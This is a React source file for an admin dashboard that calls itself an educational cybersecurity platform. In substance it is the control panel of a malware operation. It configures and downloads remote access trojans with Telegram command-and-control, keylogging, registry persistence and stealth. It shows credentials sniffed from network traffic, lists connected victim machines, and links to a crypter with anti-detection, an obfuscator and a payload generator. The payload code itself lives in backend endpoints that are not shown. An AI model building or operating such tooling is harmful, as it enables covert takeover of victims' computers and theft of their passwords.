import { useState, useEffect } from "react";
import { useQuery, useMutation, useQueryClient } from "@tanstack/react-query";
import { useLocation } from "wouter";
import { Card, CardContent, CardHeader, CardTitle, CardDescription } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { Switch } from "@/components/ui/switch";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { Alert, AlertDescription } from "@/components/ui/alert";
import { useToast } from "@/hooks/use-toast";
import { apiRequest } from "@/lib/queryClient";
import { 
  Shield, 
  LogOut, 
  Activity, 
  Users, 
  Globe, 
  AlertTriangle,
  Power,
  RotateCcw,
  TrendingUp,
  Code,
  Terminal,
  Download,
  Eye,
  Play,
  Square,
  Monitor,
  Wifi,
  Lock,
  Unlock,
  Package,
  FileCode,
  Bot,
  Zap,
  Network
} from "lucide-react";
import NetworkSniffer from "@/components/network-sniffer";
import ExecutableBuilder from "@/components/executable-builder";

export default function AdminDashboard() {
  const [, setLocation] = useLocation();
  const { toast } = useToast();
  const queryClient = useQueryClient();
  const [activeTab, setActiveTab] = useState("overview");
  
  // Real-time data states
  const [packetCaptureActive, setPacketCaptureActive] = useState(false);
  const [capturedTraffic, setCapturedTraffic] = useState([]);
  const [connectedRATs, setConnectedRATs] = useState([]);
  
  // RAT Builder Configuration
  const [ratConfig, setRatConfig] = useState({
    serverIp: '127.0.0.1',
    serverPort: 8888,
    telegramToken: '',
    chatId: '',
    persistence: true,
    keylogger: true,
    stealth: true
  });

  // Authentication check
  const { data: adminUser, error: authError } = useQuery({
    queryKey: ["/api/admin/me"],
    retry: false,
  });

  // Dashboard statistics
  const { data: stats, refetch: refetchStats } = useQuery({
    queryKey: ["/api/admin/stats"],
    refetchInterval: 5000,
  });

  // Traffic capture data
  const { data: trafficData } = useQuery({
    queryKey: ["/api/captured-traffic"],
    refetchInterval: 2000,
    enabled: packetCaptureActive
  });

  // Packet capture controls
  const startCapture = useMutation({
    mutationFn: async () => {
      const response = await apiRequest("POST", "/api/start-packet-capture", {});
      return response.json();
    },
    onSuccess: () => {
      setPacketCaptureActive(true);
      toast({
        title: "Packet Capture Started",
        description: "Real-time traffic analysis is now active"
      });
    }
  });

  const stopCapture = useMutation({
    mutationFn: async () => {
      const response = await apiRequest("POST", "/api/stop-packet-capture", {});
      return response.json();
    },
    onSuccess: () => {
      setPacketCaptureActive(false);
      toast({
        title: "Packet Capture Stopped",
        description: "Traffic analysis has been terminated"
      });
    }
  });

  // RAT Builder
  const buildRAT = useMutation({
    mutationFn: async (config: any) => {
      const response = await apiRequest("POST", "/api/build-rat", { config });
      return response.json();
    },
    onSuccess: (data) => {
      toast({
        title: "RAT Generated",
        description: `${data.filename} ready for download`
      });
      // Trigger download
      const link = document.createElement('a');
      link.href = data.downloadUrl;
      link.download = data.filename;
      link.click();
    }
  });

  // Logout functionality
  const logout = useMutation({
    mutationFn: async () => {
      const response = await apiRequest("POST", "/api/admin/logout", {});
      return response.json();
    },
    onSuccess: () => {
      setLocation("/");
      toast({
        title: "Logged Out",
        description: "Admin session terminated"
      });
    }
  });

  if (authError) {
    setLocation("/admin-portal");
    return null;
  }

  // Update traffic data when available
  useEffect(() => {
    if (trafficData) {
      setCapturedTraffic((trafficData as any)?.traffic || []);
      setPacketCaptureActive((trafficData as any)?.active || false);
    }
  }, [trafficData]);

  return (
    <div className="min-h-screen bg-gradient-to-br from-black via-gray-900 to-blue-900 text-white p-4 sm:p-6">
      {/* Header */}
      <div className="flex flex-col sm:flex-row justify-between items-start sm:items-center mb-8 space-y-4 sm:space-y-0">
        <div className="flex items-center space-x-4">
          <Shield className="w-8 h-8 text-cyan-400" />
          <div>
            <h1 className="text-2xl sm:text-3xl font-bold text-cyan-400">Admin Control Panel</h1>
            <p className="text-gray-300 text-sm sm:text-base">Educational Cybersecurity Platform Management</p>
          </div>
        </div>
        <div className="flex items-center space-x-3">
          <Badge variant="outline" className="border-green-500 text-green-400">
            <Activity className="w-4 h-4 mr-1" />
            System Active
          </Badge>
          <Button 
            onClick={() => logout.mutate()}
            variant="outline" 
            className="border-red-500 text-red-400 hover:bg-red-500/10"
          >
            <LogOut className="w-4 h-4 mr-2" />
            Logout
          </Button>
        </div>
      </div>

      {/* Stats Cards */}
      <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-4 gap-4 mb-8">
        <Card className="bg-gray-900/50 border-cyan-500/30">
          <CardContent className="p-4">
            <div className="flex items-center justify-between">
              <div>
                <p className="text-sm text-gray-400">Active Sessions</p>
                <p className="text-2xl font-bold text-cyan-400">{(stats as any)?.sessions || 0}</p>
              </div>
              <Users className="w-8 h-8 text-cyan-400" />
            </div>
          </CardContent>
        </Card>

        <Card className="bg-gray-900/50 border-green-500/30">
          <CardContent className="p-4">
            <div className="flex items-center justify-between">
              <div>
                <p className="text-sm text-gray-400">Packets Captured</p>
                <p className="text-2xl font-bold text-green-400">{capturedTraffic.length}</p>
              </div>
              <Monitor className="w-8 h-8 text-green-400" />
            </div>
          </CardContent>
        </Card>

        <Card className="bg-gray-900/50 border-yellow-500/30">
          <CardContent className="p-4">
            <div className="flex items-center justify-between">
              <div>
                <p className="text-sm text-gray-400">Connected RATs</p>
                <p className="text-2xl font-bold text-yellow-400">{connectedRATs.length}</p>
              </div>
              <Bot className="w-8 h-8 text-yellow-400" />
            </div>
          </CardContent>
        </Card>

        <Card className="bg-gray-900/50 border-red-500/30">
          <CardContent className="p-4">
            <div className="flex items-center justify-between">
              <div>
                <p className="text-sm text-gray-400">Security Events</p>
                <p className="text-2xl font-bold text-red-400">{(stats as any)?.events || 0}</p>
              </div>
              <AlertTriangle className="w-8 h-8 text-red-400" />
            </div>
          </CardContent>
        </Card>
      </div>

      {/* Main Content Tabs */}
      <Tabs value={activeTab} onValueChange={setActiveTab} className="space-y-6">
        <TabsList className="grid w-full grid-cols-2 sm:grid-cols-4 lg:grid-cols-8 bg-gray-800">
          <TabsTrigger value="overview" className="text-xs sm:text-sm">Overview</TabsTrigger>
          <TabsTrigger value="packets" className="text-xs sm:text-sm">Traffic</TabsTrigger>
          <TabsTrigger value="sniffer" className="text-xs sm:text-sm">Sniffer</TabsTrigger>
          <TabsTrigger value="builder" className="text-xs sm:text-sm">Builder</TabsTrigger>
          <TabsTrigger value="rats" className="text-xs sm:text-sm">RATs</TabsTrigger>
          <TabsTrigger value="tools" className="text-xs sm:text-sm">Tools</TabsTrigger>
          <TabsTrigger value="users" className="text-xs sm:text-sm">Users</TabsTrigger>
          <TabsTrigger value="settings" className="text-xs sm:text-sm">Settings</TabsTrigger>
        </TabsList>

        {/* Overview Tab */}
        <TabsContent value="overview" className="space-y-6">
          <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
            <Card className="bg-gray-900/50 border-cyan-500/30">
              <CardHeader>
                <CardTitle className="text-cyan-400">System Status</CardTitle>
              </CardHeader>
              <CardContent className="space-y-4">
                <div className="flex items-center justify-between">
                  <span className="text-gray-300">Packet Capture</span>
                  <Badge variant={packetCaptureActive ? "default" : "secondary"}>
                    {packetCaptureActive ? "Active" : "Inactive"}
                  </Badge>
                </div>
                <div className="flex items-center justify-between">
                  <span className="text-gray-300">RAT Server</span>
                  <Badge variant="default">Running</Badge>
                </div>
                <div className="flex items-center justify-between">
                  <span className="text-gray-300">Traffic Analysis</span>
                  <Badge variant="default">Enabled</Badge>
                </div>
              </CardContent>
            </Card>

            <Card className="bg-gray-900/50 border-green-500/30">
              <CardHeader>
                <CardTitle className="text-green-400">Recent Activity</CardTitle>
              </CardHeader>
              <CardContent>
                <div className="space-y-3 max-h-64 overflow-y-auto">
                  {capturedTraffic.slice(-5).map((packet: any, index) => (
                    <div key={index} className="p-3 bg-gray-800/50 rounded border border-gray-700">
                      <div className="flex items-center justify-between text-sm">
                        <span className="text-green-400">{packet.sourceIp}</span>
                        <span className="text-gray-400">{packet.protocol}</span>
                      </div>
                      {packet.credentials && (
                        <div className="text-xs text-yellow-400 mt-1">
                          Credentials detected: {packet.credentials.username}
                        </div>
                      )}
                    </div>
                  ))}
                </div>
              </CardContent>
            </Card>
          </div>
        </TabsContent>

        {/* Network Sniffer Tab */}
        <TabsContent value="sniffer" className="space-y-6">
          <NetworkSniffer />
        </TabsContent>

        {/* Executable Builder Tab */}
        <TabsContent value="builder" className="space-y-6">
          <ExecutableBuilder />
        </TabsContent>

        {/* Packet Capture Tab */}
        <TabsContent value="packets" className="space-y-6">
          <Card className="bg-gray-900/50 border-cyan-500/30">
            <CardHeader>
              <CardTitle className="text-cyan-400 flex items-center">
                <Wifi className="w-5 h-5 mr-2" />
                Real-Time Packet Capture
              </CardTitle>
              <CardDescription>
                Monitor and analyze network traffic in real-time
              </CardDescription>
            </CardHeader>
            <CardContent className="space-y-4">
              <div className="flex flex-col sm:flex-row gap-4">
                <Button
                  onClick={() => startCapture.mutate()}
                  disabled={packetCaptureActive || startCapture.isPending}
                  className="bg-green-600 hover:bg-green-700"
                >
                  <Play className="w-4 h-4 mr-2" />
                  Start Capture
                </Button>
                <Button
                  onClick={() => stopCapture.mutate()}
                  disabled={!packetCaptureActive || stopCapture.isPending}
                  variant="destructive"
                >
                  <Stop className="w-4 h-4 mr-2" />
                  Stop Capture
                </Button>
              </div>

              {packetCaptureActive && (
                <Alert className="border-green-500/30 bg-green-500/10">
                  <Activity className="h-4 w-4" />
                  <AlertDescription className="text-green-200">
                    Packet capture is active. Monitoring all network traffic and extracting credentials.
                  </AlertDescription>
                </Alert>
              )}

              <div className="space-y-3 max-h-96 overflow-y-auto">
                {capturedTraffic.map((packet: any, index) => (
                  <Card key={index} className="bg-gray-800/50 border-gray-700">
                    <CardContent className="p-4">
                      <div className="grid grid-cols-1 sm:grid-cols-3 gap-4">
                        <div>
                          <p className="text-xs text-gray-400">Source → Destination</p>
                          <p className="text-sm text-cyan-400">{packet.sourceIp} → {packet.destinationIp}</p>
                        </div>
                        <div>
                          <p className="text-xs text-gray-400">Protocol:Port</p>
                          <p className="text-sm text-green-400">{packet.protocol}:{packet.port}</p>
                        </div>
                        <div>
                          <p className="text-xs text-gray-400">Timestamp</p>
                          <p className="text-sm text-gray-300">{new Date(packet.timestamp).toLocaleTimeString()}</p>
                        </div>
                      </div>
                      
                      {packet.credentials && (
                        <div className="mt-3 p-2 bg-yellow-900/20 border border-yellow-500/30 rounded">
                          <p className="text-xs text-yellow-400 font-medium">CREDENTIALS EXTRACTED:</p>
                          <p className="text-sm text-yellow-300">User: {packet.credentials.username}</p>
                          <p className="text-sm text-yellow-300">Pass: {packet.credentials.password}</p>
                        </div>
                      )}
                      
                      {packet.url && (
                        <div className="mt-2">
                          <p className="text-xs text-gray-400">URL:</p>
                          <p className="text-sm text-blue-400 truncate">{packet.url}</p>
                        </div>
                      )}
                    </CardContent>
                  </Card>
                ))}
              </div>
            </CardContent>
          </Card>
        </TabsContent>

        {/* RAT Management Tab */}
        <TabsContent value="rats" className="space-y-6">
          <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
            <Card className="bg-gray-900/50 border-cyan-500/30">
              <CardHeader>
                <CardTitle className="text-cyan-400">RAT Builder</CardTitle>
                <CardDescription>Generate custom Millennium RAT payloads</CardDescription>
              </CardHeader>
              <CardContent className="space-y-4">
                <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                  <div>
                    <Label htmlFor="serverIp" className="text-gray-300">Server IP</Label>
                    <Input
                      id="serverIp"
                      value={ratConfig.serverIp}
                      onChange={(e) => setRatConfig(prev => ({ ...prev, serverIp: e.target.value }))}
                      className="bg-gray-800 border-gray-600 text-white"
                    />
                  </div>
                  <div>
                    <Label htmlFor="serverPort" className="text-gray-300">Server Port</Label>
                    <Input
                      id="serverPort"
                      type="number"
                      value={ratConfig.serverPort}
                      onChange={(e) => setRatConfig(prev => ({ ...prev, serverPort: parseInt(e.target.value) }))}
                      className="bg-gray-800 border-gray-600 text-white"
                    />
                  </div>
                </div>

                <div>
                  <Label htmlFor="telegramToken" className="text-gray-300">Telegram Bot Token</Label>
                  <Input
                    id="telegramToken"
                    value={ratConfig.telegramToken}
                    onChange={(e) => setRatConfig(prev => ({ ...prev, telegramToken: e.target.value }))}
                    className="bg-gray-800 border-gray-600 text-white"
                    placeholder="Bot token for C2 communication"
                  />
                </div>

                <div>
                  <Label htmlFor="chatId" className="text-gray-300">Chat ID</Label>
                  <Input
                    id="chatId"
                    value={ratConfig.chatId}
                    onChange={(e) => setRatConfig(prev => ({ ...prev, chatId: e.target.value }))}
                    className="bg-gray-800 border-gray-600 text-white"
                    placeholder="Telegram chat ID"
                  />
                </div>

                <div className="space-y-3">
                  <div className="flex items-center justify-between">
                    <Label className="text-gray-300">Registry Persistence</Label>
                    <Switch
                      checked={ratConfig.persistence}
                      onCheckedChange={(checked) => setRatConfig(prev => ({ ...prev, persistence: checked }))}
                    />
                  </div>
                  
                  <div className="flex items-center justify-between">
                    <Label className="text-gray-300">Keylogger</Label>
                    <Switch
                      checked={ratConfig.keylogger}
                      onCheckedChange={(checked) => setRatConfig(prev => ({ ...prev, keylogger: checked }))}
                    />
                  </div>
                  
                  <div className="flex items-center justify-between">
                    <Label className="text-gray-300">Stealth Mode</Label>
                    <Switch
                      checked={ratConfig.stealth}
                      onCheckedChange={(checked) => setRatConfig(prev => ({ ...prev, stealth: checked }))}
                    />
                  </div>
                </div>

                <Button
                  onClick={() => buildRAT.mutate(ratConfig)}
                  disabled={buildRAT.isPending}
                  className="w-full bg-cyan-600 hover:bg-cyan-700"
                >
                  <Package className="w-4 h-4 mr-2" />
                  {buildRAT.isPending ? 'Building...' : 'Build RAT'}
                </Button>
              </CardContent>
            </Card>

            <Card className="bg-gray-900/50 border-green-500/30">
              <CardHeader>
                <CardTitle className="text-green-400">Connected RATs</CardTitle>
                <CardDescription>Active remote access sessions</CardDescription>
              </CardHeader>
              <CardContent>
                <div className="space-y-3">
                  {connectedRATs.length === 0 ? (
                    <div className="text-center py-8 text-gray-400">
                      <Bot className="w-12 h-12 mx-auto mb-4 opacity-50" />
                      <p>No active RAT connections</p>
                      <p className="text-sm">Deploy RATs to see them here</p>
                    </div>
                  ) : (
                    connectedRATs.map((rat: any, index) => (
                      <Card key={index} className="bg-gray-800/50 border-gray-700">
                        <CardContent className="p-4">
                          <div className="flex items-center justify-between">
                            <div>
                              <p className="text-sm font-medium text-green-400">{rat.hostname}</p>
                              <p className="text-xs text-gray-400">{rat.ip} - {rat.username}</p>
                            </div>
                            <Badge variant="default">Online</Badge>
                          </div>
                        </CardContent>
                      </Card>
                    ))
                  )}
                </div>
              </CardContent>
            </Card>
          </div>
        </TabsContent>

        {/* Tools Tab */}
        <TabsContent value="tools" className="space-y-6">
          <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-6">
            <Card className="bg-gray-900/50 border-cyan-500/30">
              <CardHeader>
                <CardTitle className="text-cyan-400">Advanced Crypter</CardTitle>
              </CardHeader>
              <CardContent>
                <p className="text-gray-300 text-sm mb-4">Multi-layer encryption with anti-detection</p>
                <Button className="w-full bg-cyan-600 hover:bg-cyan-700">
                  <Lock className="w-4 h-4 mr-2" />
                  Launch Crypter
                </Button>
              </CardContent>
            </Card>

            <Card className="bg-gray-900/50 border-green-500/30">
              <CardHeader>
                <CardTitle className="text-green-400">Script Processor</CardTitle>
              </CardHeader>
              <CardContent>
                <p className="text-gray-300 text-sm mb-4">Obfuscation and optimization tools</p>
                <Button className="w-full bg-green-600 hover:bg-green-700">
                  <Code className="w-4 h-4 mr-2" />
                  Process Scripts
                </Button>
              </CardContent>
            </Card>

            <Card className="bg-gray-900/50 border-yellow-500/30">
              <CardHeader>
                <CardTitle className="text-yellow-400">Payload Generator</CardTitle>
              </CardHeader>
              <CardContent>
                <p className="text-gray-300 text-sm mb-4">Custom payload creation toolkit</p>
                <Button className="w-full bg-yellow-600 hover:bg-yellow-700">
                  <Zap className="w-4 h-4 mr-2" />
                  Generate Payload
                </Button>
              </CardContent>
            </Card>
          </div>
        </TabsContent>

        {/* Users Tab */}
        <TabsContent value="users" className="space-y-6">
          <Card className="bg-gray-900/50 border-cyan-500/30">
            <CardHeader>
              <CardTitle className="text-cyan-400">User Management</CardTitle>
              <CardDescription>Manage admin access and permissions</CardDescription>
            </CardHeader>
            <CardContent>
              <div className="text-center py-8 text-gray-400">
                <Users className="w-12 h-12 mx-auto mb-4 opacity-50" />
                <p>User management interface</p>
                <p className="text-sm">Coming soon</p>
              </div>
            </CardContent>
          </Card>
        </TabsContent>

        {/* Settings Tab */}
        <TabsContent value="settings" className="space-y-6">
          <Card className="bg-gray-900/50 border-cyan-500/30">
            <CardHeader>
              <CardTitle className="text-cyan-400">System Settings</CardTitle>
              <CardDescription>Configure platform parameters</CardDescription>
            </CardHeader>
            <CardContent>
              <div className="text-center py-8 text-gray-400">
                <Terminal className="w-12 h-12 mx-auto mb-4 opacity-50" />
                <p>Settings panel</p>
                <p className="text-sm">Configuration options</p>
              </div>
            </CardContent>
          </Card>
        </TabsContent>
      </Tabs>
    </div>
  );
}